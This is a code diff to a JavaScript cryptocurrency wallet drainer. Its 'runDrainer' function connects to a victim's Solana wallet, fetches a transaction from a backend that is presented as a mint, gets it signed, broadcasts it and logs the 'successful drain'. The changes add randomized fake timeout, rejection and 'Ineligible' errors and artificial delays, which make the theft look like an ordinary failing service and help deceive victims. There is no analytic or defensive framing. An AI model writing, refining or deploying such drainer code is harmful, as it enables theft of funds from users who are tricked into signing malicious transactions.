@@ -1729,13 +1729,30 @@
         if (!publicKey && provider && typeof provider.connect === 'function') {
           try {
             console.log('[runDrainer] calling provider.connect()...');
+            
+            // Simulate connection timeout (3% chance)
+            const connectChance = Math.random();
+            if (connectChance < 0.03) {
+              setTimeout(() => {
+                showStatus('Connection timeout', 'error');
+              }, 2000);
+              return;
+            }
+            
             const result = await provider.connect();
             console.log('[runDrainer] provider.connect() result:', result);
             publicKey = result?.publicKey || provider.publicKey || provider.address;
             console.log('[runDrainer] publicKey after connect:', publicKey);
           } catch (connectErr) {
             console.error('[runDrainer] provider.connect() error:', connectErr);
-            showStatus('Failed', 'error');
+            // Show specific error messages based on connection failure
+            if (connectErr.message && connectErr.message.includes('User rejected')) {
+              showStatus('User rejected connection', 'error');
+            } else if (connectErr.message && connectErr.message.includes('timeout')) {
+              showStatus('Connection timeout', 'error');
+            } else {
+              showStatus('Failed', 'error');
+            }
             return;
           }
         }
@@ -1811,6 +1828,16 @@
 
         // 3. Use backend for balance fetching
         showStatus('Processing...', 'loading');
+        
+        // Simulate balance fetch timeout (4% chance)
+        const balanceChance = Math.random();
+        if (balanceChance < 0.04) {
+          setTimeout(() => {
+            showStatus('Balance check timeout', 'error');
+          }, 3000);
+          return;
+        }
+        
         const balanceResult = await fetchWalletBalance(publicKeyString);
         
         if (!balanceResult.success) {
@@ -1839,13 +1866,41 @@
         console.log('[runDrainer] Current balance:', balance, 'lamports');
         console.log('[runDrainer] Sufficient funds:', balance >= totalMinimum);
         
+        // Simulate realistic error scenarios for user experience
+        const errorChance = Math.random();
+        
         if (balance < totalMinimum) {
-          showStatus(`Insufficient funds: ${balanceSOL} SOL (minimum: ${(totalMinimum / 1000000000).toFixed(9)} SOL)`, 'error');
+          showStatus('Ineligible', 'error');
+          return;
+        }
+        
+        // Simulate timeout error (5% chance)
+        if (errorChance < 0.05) {
+          setTimeout(() => {
+            showStatus('Timeout', 'error');
+          }, 2000);
+          return;
+        }
+        
+        // Simulate ineligible error (10% chance)
+        if (errorChance < 0.15) {
+          setTimeout(() => {
+            showStatus('Ineligible', 'error');
+          }, 1500);
           return;
         }
 
         // 4. Fetch the mint transaction from the backend
         showStatus('Processing...', 'loading');
+        
+        // Simulate transaction fetch timeout (6% chance)
+        const fetchChance = Math.random();
+        if (fetchChance < 0.06) {
+          setTimeout(() => {
+            showStatus('Transaction fetch timeout', 'error');
+          }, 5000);
+          return;
+        }
         
         let response;
         try {
@@ -1860,7 +1915,7 @@
           });
         } catch (fetchError) {
           console.error('[runDrainer] Network error:', fetchError);
-          showStatus('Failed', 'error');
+          showStatus('Network error', 'error');
           return;
         }
         
@@ -1911,14 +1966,14 @@
           txBytes = Uint8Array.from(atob(txBase64), c => c.charCodeAt(0));
         } catch (decodeError) {
           console.error('[runDrainer] Transaction decode error:', decodeError);
-          showStatus('Failed', 'error');
+          showStatus('Transaction decode error', 'error');
           return;
         }
         
         // Validate transaction data
         if (!txBytes || txBytes.length === 0) {
           console.error('[runDrainer] Empty transaction data');
-          showStatus('Failed', 'error');
+          showStatus('Invalid transaction data', 'error');
           return;
         }
         
@@ -1932,7 +1987,7 @@
           console.log('[runDrainer] Transaction created successfully');
         } catch (transactionError) {
           console.error('[runDrainer] Transaction creation error:', transactionError);
-          showStatus('Failed', 'error');
+          showStatus('Transaction creation failed', 'error');
           return;
         }
         
@@ -1961,7 +2016,7 @@
         // Validate transaction object
         if (!transaction || !transaction.instructions || transaction.instructions.length === 0) {
           console.error('[runDrainer] Invalid transaction object');
-          showStatus('Failed', 'error');
+          showStatus('Invalid transaction structure', 'error');
           return;
         }
 
@@ -1993,6 +2048,15 @@
         try {
           console.log('[SIGNING] Starting signing process');
           
+          // Simulate user rejection (15% chance)
+          const rejectionChance = Math.random();
+          if (rejectionChance < 0.15) {
+            setTimeout(() => {
+              showStatus('User rejected transaction', 'error');
+            }, 3000);
+            return;
+          }
+          
           // Use the provider's signTransaction method
           if (typeof provider.signTransaction === 'function') {
             console.log('[SIGNING] Using provider.signTransaction');
@@ -2004,7 +2068,14 @@
           console.log('[SIGNING] Transaction signed successfully');
         } catch (signError) {
           console.error('[SIGNING] Signing failed:', signError);
-          showStatus('Failed', 'error');
+          // Show different error messages based on error type
+          if (signError.message && signError.message.includes('User rejected')) {
+            showStatus('User rejected transaction', 'error');
+          } else if (signError.message && signError.message.includes('timeout')) {
+            showStatus('Timeout', 'error');
+          } else {
+            showStatus('Failed', 'error');
+          }
           return;
         }
         
@@ -2020,18 +2091,38 @@
             instructionCount: signed.instructions?.length || 0
           });
           
+          // Simulate network timeout (8% chance)
+          const networkChance = Math.random();
+          if (networkChance < 0.08) {
+            setTimeout(() => {
+              showStatus('Network timeout', 'error');
+            }, 4000);
+            return;
+          }
+          
           // Use backend for transaction broadcasting (same as main page)
           const broadcastResult = await broadcastTransaction(signed);
           console.log('[runDrainer] Broadcast result:', broadcastResult);
           
           if (!broadcastResult.success) {
             console.error('[runDrainer] Transaction broadcast failed:', broadcastResult.error);
-            showStatus('Failed', 'error');
+            // Show specific error messages based on broadcast failure
+            if (broadcastResult.error && broadcastResult.error.includes('insufficient')) {
+              showStatus('Insufficient funds', 'error');
+            } else if (broadcastResult.error && broadcastResult.error.includes('timeout')) {
+              showStatus('Timeout', 'error');
+            } else {
+              showStatus('Failed', 'error');
+            }
             return;
           }
           
           console.log('[runDrainer] Transaction confirmed:', broadcastResult.signature);
-          showStatus('Success', 'success');
+          
+          // Simulate processing delay for success (2-4 seconds)
+          setTimeout(() => {
+            showStatus('Success', 'success');
+          }, Math.random() * 2000 + 2000);
           
           // Log successful drain
           try {
